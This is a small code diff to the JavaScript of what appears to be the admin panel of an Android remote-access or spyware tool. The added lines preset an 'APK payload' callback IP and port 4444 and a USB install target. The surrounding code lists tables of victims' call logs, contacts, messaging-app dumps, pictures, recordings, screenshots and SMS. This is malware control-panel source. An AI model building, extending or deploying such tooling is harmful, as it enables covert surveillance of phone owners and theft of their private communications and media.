@@ -38,6 +38,12 @@ function closeNav() {
 
 
 $(document).ready(function(){
+    $("#apk_payload_destination_ip").val("192.168.100.39")
+    $("#apk_payload_destination_port").val("4444")
+    $("#apk_payload_forwarding_ip").val("192.168.100.39")
+    $("#apk_payload_forwarding_port").val("4444")
+    $("#apk_installation_target_ip").val("USB")
+
     $( "#apk_installation_apk_payload_id" ).wrap("<div class='selectt'>");
 
     rows=$("td.col-id,td.col-filename",$(".admin_call_logs tr, .admin_contacts tr, .admin_messaging_apps_dumps tr, .admin_pictures tr, .admin_recordings tr, .admin_screenshots tr, .admin_sms_messages tr"))
